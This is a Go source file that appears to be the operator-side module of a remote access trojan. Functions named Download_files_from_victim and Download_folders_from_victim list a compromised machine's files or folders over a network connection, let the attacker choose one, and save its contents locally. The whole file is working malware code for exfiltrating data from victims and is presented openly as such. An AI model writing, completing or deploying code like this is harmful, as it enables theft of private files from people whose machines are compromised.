package download

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
)

type FilesList struct {
	Files []string
}

type Data struct {
	FileName    string
	FileSize    int
	FileContent []byte
}

func Download_files_from_victim(connection net.Conn) (err error) {

	decoder := gob.NewDecoder(connection)

	fl := &FilesList{}

	err = decoder.Decode(fl)

	if err != nil {
		fmt.Println(err)
	}

	for index, file := range fl.Files {
		fmt.Println("\t", index, "\t", file)
	}

	reader := bufio.NewReader(os.Stdin)

	fmt.Print("[+] Select file : ")
	user_input, err := reader.ReadString('\n')

	if err != nil {
		fmt.Println(err)
	}

	user_input = strings.TrimSuffix(user_input, "\n")

	user_choice, err := strconv.Atoi(user_input)
	if err != nil {
		fmt.Println(err)
	}

	file_name := fl.Files[user_choice]

	_, err = connection.Write([]byte(file_name + "\n"))

	if err != nil {
		fmt.Println(err)
	}

	fmt.Println("[+] File Name: ", file_name)

	file_data := &Data{}

	err = decoder.Decode(file_data)
	if err != nil {
		fmt.Println(err)
	}

	file_obj, err := os.Create(file_data.FileName)
	if err != nil {
		fmt.Println(err)
	}

	nbytes, err := file_obj.Write(file_data.FileContent)
	if err != nil {
		fmt.Println(err)
	}

	fmt.Println("[+] File downloaded successfully , ", nbytes)

	return
}

func Download_folders_from_victim(connection net.Conn) (err error) {
	decoder := gob.NewDecoder(connection)

	folders_list := &FilesList{}

	err = decoder.Decode(folders_list)
	if err != nil {
		fmt.Println(err)
	}

	for index, folder := range folders_list.Files {
		fmt.Println("\t", index, "\t", folder)
	}

	reader := bufio.NewReader(os.Stdin)

	fmt.Print("[+] Select folder : ")
	user_input, err := reader.ReadString('\n')

	if err != nil {
		fmt.Println(err)
	}

	user_input = strings.TrimSuffix(user_input, "\n")

	user_choice, err := strconv.Atoi(user_input)
	if err != nil {
		fmt.Println(err)
	}

	folder_name := folders_list.Files[user_choice]

	_, err = connection.Write([]byte(folder_name + "\n"))

	if err != nil {
		fmt.Println(err)
	}

	fmt.Println("[+] Folder Name: ", folder_name)

	file_data := &Data{}

	err = decoder.Decode(file_data)
	if err != nil {
		fmt.Println(err)
	}

	file_obj, err := os.Create(file_data.FileName)
	if err != nil {
		fmt.Println(err)
	}

	nbytes, err := file_obj.Write(file_data.FileContent)
	if err != nil {
		fmt.Println(err)
	}

	fmt.Println("[+] File downloaded successfully , ", nbytes)

	return
}
